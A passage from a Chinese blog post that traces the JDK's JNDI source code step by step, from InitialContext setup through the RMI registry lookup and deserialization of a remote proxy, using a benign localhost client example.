</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JNDI_Main</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Hashtable</span><span class="w"> </span><span class="n">env</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Hashtable</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">env</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">Context</span><span class="p">.</span><span class="na">INITIAL_CONTEXT_FACTORY</span><span class="p">,</span><span class="s">&#34;com.sun.jndi.rmi.registry.RegistryContextFactory&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">env</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">Context</span><span class="p">.</span><span class="na">PROVIDER_URL</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;rmi://localhost:1099&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Context</span><span class="w"> </span><span class="n">initialContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialContext</span><span class="p">(</span><span class="n">env</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//获取远程代理类</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RemoteInterface</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">RemoteInterface</span><span class="p">)</span><span class="w"> </span><span class="n">initialContext</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;Hello&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//调用远程对象的方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">o</span><span class="p">.</span><span class="na">sayHello</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>成功调用方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410072205946.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241007220525892"
	
	
></p>
<h4 id="源码分析">源码分析
</h4><h5 id="命名服务初始化上下文">命名服务初始化上下文
</h5><p>对应代码为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Context</span><span class="w"> </span><span class="n">initialContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialContext</span><span class="p">(</span><span class="n">env</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>有前面的代码可以看出，这里我们是传入了一个Hashtable类，里面包含了构造的两个键值对。看看会对这个进行什么处理跟进一下这里的InitialContext类的构造方法（注意要先启动RMI的Server端）：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410072241375.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241007224119334"
	
	
></p>
<p>如预期，有键值对，这里的clone()方法简单来说就是一个拷贝的操作，其实调用这个方法后的Hashtable类与原先没有太大区别，这个方法后的environment参数也是没有问题的。</p>
<p>然后调用了init()方法，并往里面传进了environment，跟进这个方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410072249897.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241007224942852"
	
	
></p>
<p>然后这里调用了ResourceManager#getInitialEnvironment()方法，简单跟进一下，几个重点代码：</p>
<p>获取applet参数的代码：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082220010.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008222045978"
	
	
></p>
<p>两个点，</p>
<ul>
<li>第一个框，获取到VersionHelper类的PROPS变量，变量定义如下：</li>
</ul>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082222677.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008222247644"
	
	
></p>
<p>里面就有我们原先放入的两个变量，这个变量记录了Context接口的常量信息，所以现在就是<strong>将props变量赋值为了上面的包含Context接口常量信息的数组</strong></p>
<ul>
<li>第二个框，就是从Hashtable中获取以APPLET变量为值的键的值，在Context接口中的APPLET变量定义：</li>
</ul>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082220370.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008222004340"
	
	
></p>
<p>很明显我们当初并没有往Hashtable类放入这个变量，所以这里就是一个空，即为null。</p>
<p>继续往后面看，代码如下：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082228783.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008222834744"
	
	
></p>
<p>这里的helper变量定义：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082228127.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008222855091"
	
	
></p>
<p>跟进VersionHelper#getVersionHelper()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082229215.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008222921183"
	
	
></p>
<p>所以其实也就是获取到VersionHelper12类实例。所以在前面的方法调用中，其实是会调用VersionHelper12类的getJndiProperties()方法，简单看了一下，很像在调用System.getProperty()方法，这里会返回一个数组，结果全为null：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082236711.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008223656680"
	
	
></p>
<p>然后就调用了for循环，几个关键点：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082239471.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008223940434"
	
	
></p>
<p>这里就是调用了前面的数组，如果在Hashtable类中存在数组中的一个值，那么就直接进入下一个for循环，可以想出只会有两次操作是直接进入下一个for循环，那么没有定义的呢，就会进入到if条件语句，并且在前面可以知道获取到的applet变量为null，所以其实就是调用的下面的代码：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082249182.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008224943148"
	
	
></p>
<p>没啥大的分析过程，最后还是返回的这个Hashtable类：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082305391.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008230502358"
	
	
></p>
<p>可能是因为我指定了环境变量，没有使用setProperty()方法来放变量。可以换代码再跟一下，过程有细微差别，但不影响，最后在jndiSysProps变量的赋值确实有不同：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082255440.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008225543407"
	
	
></p>
<p>大差不差，就是前面会实例化一个Hashtable类，后面会调用Hashtable类的put()方法</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082301284.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008230108249"
	
	
></p>
<p>还是会构造成一个Hashtable类。</p>
<p>所以最终结果还是这个Hashtable类：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410072252032.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241007225247998"
	
	
></p>
<p>ResourceManager#getInitialEnvironment()方法分析结束。</p>
<p>所以这个步骤的目的就是确保后面能传入一个“填充”好的Hashtable类。</p>
<p>————————</p>
<p><strong>回到InitialContext类的init()方法</strong>，再粘过来一次代码：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082307414.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008230722377"
	
	
></p>
<p>然后后面无疑会调用getDefaultInitCtx()方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410081311296.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008131120257"
	
	
></p>
<p>所以现在会调用NamingManager类的getInitialContext()方法，并传入了前面构造了的Hastable类，跟进这个方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410081319016.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008131948964"
	
	
></p>
<p><strong>按顺序解析一下这个方法</strong>在干嘛。</p>
<p>首先调用了getInitialContextFactoryBuilder()方法，跟进一下：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410081321041.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008132132003"
	
	
></p>
<p>所以会返回null，然后就会进入后面的if条件：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410081324574.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008132408537"
	
	
></p>
<p>所以很正常这里会获取到env变量（Hashtable类）的INITIAL_CONTEXT_FACTORY，所以也就是前面的RegistryContextFactory类，所以后面就不会进入if条件。</p>
<p>继续往后看：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410081328418.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008132820384"
	
	
></p>
<p>所以这里应该就是会加载这个类为Class对象，然后对这个Class对象调用newInstance()方法将其实例化。所以这里就是会获取到RegistryContextFactory类实例：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410081334662.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008133447629"
	
	
></p>
<p>并将这个实例化类赋值给了factory变量，再往后看，就会到如下代码：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410081336098.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008133617069"
	
	
></p>
<p>所以现在会调用RegistryContextFactory类的getInitialContext()方法，并传入了env变量（就是Hashtable类），跟进getInitialContext()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410081338289.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008133834258"
	
	
></p>
<p>现在又对这个Hashatble类调用了clone()方法，“克隆”一次？先将其理解为就是前面传入的Hashtable类。然后聚焦于return调用的两个方法，分别跟进一下：</p>
<ul>
<li>getInitCtxURL(var1)：</li>
</ul>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410081342915.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008134251884"
	
	
></p>
<p>这里容易看出会进入if条件，然后对这个Hashtable类调用了取值的操作，这里也就是前面放进的值，所以会将var2变量赋值为&quot;rmi://localhost:1099&quot;，所以最终这个<strong>getInitCtxURL()方法就是返回了这个var2，即&quot;rmi://localhost:1099&quot;</strong>，也就是获取“环境变量”指定的服务地址。</p>
<ul>
<li>URLToContext()方法：</li>
</ul>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410081350439.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008135003404"
	
	
></p>
<p>代码如上，简单说明一下参数问题：（var0 ==》 rmi://localhost:1099 ； var1 ==》 Hashtable类），在这个方法中，可以看到又实例化了一个rmiURLContextFactory类，然后调用了这个类的getObjectInstance()方法（传入了var0和var1），跟进一下：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082007920.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008200703748"
	
	
></p>
<p>可以看出来这里会进入到第一个else if语句，所以现在会调用getUsingURL()方法，继续跟进：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082009404.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008200946340"
	
	
></p>
<p>喔，简单瞟一眼，看到了一个老朋友，lookup()方法，有点意思。现在来跟一下这里的方法源码：</p>
<p>这里先实例化了一个rmiURLContext类，并传入了var1（Hashtable类），简单跟一下这里的初始化过程：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082015563.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008201508521"
	
	
></p>
<p>先跟进rmiURLContext类的父类GenericURLContext类的构造方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082015893.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008201558758"
	
	
></p>
<p>所以这里就是将GenericURLContext类的<strong>myEnv变量赋值为Hashtable类</strong>：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082018675.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008201828624"
	
	
></p>
<p>回到rmiURLContextFactory类的getUsingURL()方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082019607.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008201930539"
	
	
></p>
<p>来看看这里的lookup()方法会干嘛，所以现在会调用rmiURLContext类的lookup()方法，但是rmiURLContext类没有lookup()方法，所以会调用到父类GenericURLContext类的lookup()方法（传入了var0，如上图所示的变量）：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410082022287.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008202257222"
	
	
></p>
<p>跟进这里的getRootURLContext()方法，传入了var1参数和刚好在前面初始化类时赋值的变量myEnv（也就是Hashtable类），简单跟跟，说几个重点，方法结果如下：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410091219538.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009121953445"
	
	
></p>
<p>这里可以看到实例化了两个类，对应代码如下：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410110119795.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011011917703"
	
	
></p>
<p>前面的CompositeName类的初始化就不多说了，重点看RegistryContext类的初始化：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410110120098.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011012043031"
	
	
></p>
<p>就是将这里的environment变量赋值为了Hashtable类实例，然后将这里的registry、host、port变量分别赋值，简单跟一下这里的getRegistry()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410110123825.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011012344778"
	
	
></p>
<p>如下：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410110124514.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011012442461"
	
	
></p>
<p>然后又会调用LocateRegistry类的getRegistry()方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410110126401.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011012621349"
	
	
></p>
<p>调用另一个重载的getRegistry()方法，在方法最后见到了老朋友：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410110128334.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011012855277"
	
	
></p>
<p>在这个方法中，会创建RegistryImpl_Stub类：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410110130555.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011013033499"
	
	
></p>
<p>最后也就会返回这个RegistryImpl_Stub类。（后面再碰到的getRootURLContext()方法都是差不多的）</p>
<p>回到RegistryContext类的构造方法然后host和port的赋值：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410110132345.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011013200295"
	
	
></p>
<p>最后在rmiURLContext类的getRootURLContext()方法将CompositeName类和RegistryContext封装进了ResolveResult类并返回了它。</p>
<p>——————</p>
<p>回到lookup()方法，然后后面调用的两个方法：getResolvedObj()和getRemainingName()方法，都是获取变量值的操作，对应上面结果中的ResolveResult类中的两个变量。</p>
<p>所以后面的var3变量的值为RegistryContext类实例：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410091223958.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009122346890"
	
	
></p>
<p>这几个变量的值还是挺重要的。</p>
<p>——————</p>
<p>后面又会调用RegistryContext类的lookup()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410091820400.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009182041226"
	
	
></p>
<p>这里的var2.getRemainingName会返回前面说过的变量，值为：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410091821378.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009182134335"
	
	
></p>
<p>也还是对应前面的var2中的变量。</p>
<p>继续跟进RegistryContext类的lookup()方法，传入了CompositeName类实例：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410091824149.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009182447104"
	
	
></p>
<p>然后这里会进入第一个if条件，会实例化一个RegistryContext类并返回它，在实例化时会进行一些初始化操作：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410091828904.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009182829759"
	
	
></p>
<p>最后返回了这个RegistryContext类，这个类还是包含了一下重要信息。</p>
<p>然后简单跟了一下return的部分，最后就是将InitialContext类的defaultInitCtx变量赋值为了这刚RegistyContext类。</p>
<h5 id="命名服务获取对象">命名服务获取对象
</h5><p>对应代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">RemoteInterface</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">RemoteInterface</span><span class="p">)</span><span class="w"> </span><span class="n">initialContext</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;Hello&#34;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>前面获取到了InitialContext类并进行了一些重要的赋值操作，类变量定义如下：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410091844535.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009184452495"
	
	
></p>
<p>所以现在会调用InitialContext类的lookup()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410091845100.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009184558063"
	
	
></p>
<p>先跟进一下这里的getURLOrDefaultInitCtx()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410091848860.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009184816815"
	
	
></p>
<p>第一个if条件不会进入，跟一下还是很好看出的，这里不多赘述。</p>
<p>后面的schema的值为null，调用的getURLSchema()方法也是容易看的。</p>
<p>所以最后会调用getDefaultInitCtx()方法，又是这个方法，但是这里却直接返回值，如下：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410091851025.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009185144987"
	
	
></p>
<p>由于前面初始化时会将这里的gotDefault变量设置为true，所以这里会直接<strong>返回定义的defaultInitCtx变量，即前面的RegistryContext类实例。</strong></p>
<p>即<code>getURLOrDefaultInitCtx(name)</code>的调用就是获取RegistryContext类实例。</p>
<p>———</p>
<p>回到InitialContext类的lookup()方法，所以现在会调用RegistryContext类的lookup()方法，并传入了Hello这个参数变量：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410091856664.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009185624630"
	
	
></p>
<p>两个点，都跟一下：</p>
<ul>
<li>CompositeName类的初始化：</li>
</ul>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410091857443.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009185743408"
	
	
></p>
<p>也就是给CompositeName类的impl变量赋值。</p>
<ul>
<li>调用了RegistryContext类的另一个lookup()方法，并将前面的CompositeName类传了进去：</li>
</ul>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410091900652.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009190027612"
	
	
></p>
<p>这里又调用了这个lookup()方法，但是有很明显的区别，就是这里的var1有值。就简单理解为将一个字符串名转换成对应的Name类型对象。所以现在会进入else语句：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410091907632.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009190708588"
	
	
></p>
<p>然后就会调用RegistryImpl_Stub类的lookup()方法，用来查找RMI服务：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410091908738.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009190804707"
	
	
></p>
<p>也就是比较熟悉的操作了：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410091909237.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009190902184"
	
	
></p>
<p>最后这里反序列化获取代理对象。</p>
<p>也就是那个代理对象：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410091915063.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009191520029"
	
	
></p>
<p>后续代码的方法调用就和RMI的差不多了。</p>
<p>最终成功达到访问一次RMI服务的操作。</p>
<h4 id="补充说明">补充说明
</h4><h5 id="动态协议切换">动态协议切换
</h5><p>在前面的协议转换中，提到了一个不需指定环境变量，可以通过服务地址直接获取到相应对象，完整实现代码如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">JNDI</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">Rmi.Server.RemoteInterface</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.InitialContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JNDI_Main</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 创建JNDI目录服务上下文</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InitialContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialContext</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 查找JNDI目录服务绑定的对象</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RemoteInterface</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">RemoteInterface</span><span class="p">)</span><span class="n">context</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;rmi://127.0.0.1:1099/Hello&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">o</span><span class="p">.</span><span class="na">sayHello</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>（注意起RMI Server服务）</p>
<p>这样也能实现一次远程方法调用。</p>
<p>现在来分析一下过程，一步一步来：</p>
<h6 id="命名服务初始化">命名服务初始化
</h6><p>对应代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">InitialContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialContext</span><span class="p">();</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>这里的过程其实都和前面将要求的值放入如环境属性中差不多的，刚好前面只是略过，这里稍微详细讲讲：</p>
<p>调用的构造方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410101934958.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010193437916"
	
	
></p>
<p>调用Init()方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410101935294.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010193515246"
	
	
></p>
<p>跟进ResourceManager类的getInitialEnvironment()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410101936093.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010193647028"
	
	
></p>
<p>前面实例化了一个Hashtable类，后面的getJndiProperty()方法中有读取环境属性的代码，如果读取到了就会放进Hashtable类中，但是我们并没有往环境属性中放东西，所以最终返回的这个Hashtable类是空的：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410101941784.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010194103742"
	
	
></p>
<p>所以后续的调用get()方法是无法获取值的，所以就直接结束初始化了：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410101941549.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010194149503"
	
	
></p>
<h6 id="命名服务获取对象-1">命名服务获取对象
</h6><p>对应代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">RemoteInterface</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">RemoteInterface</span><span class="p">)</span><span class="n">context</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;rmi://127.0.0.1:1099/Hello&#34;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>会调用InitialContext类的lookup()方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410101916571.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010191658451"
	
	
></p>
<p>还是分别跟一下：</p>
<ul>
<li>又是getURLOrDefaultInitCtx()方法：</li>
</ul>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410101918706.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010191826660"
	
	
></p>
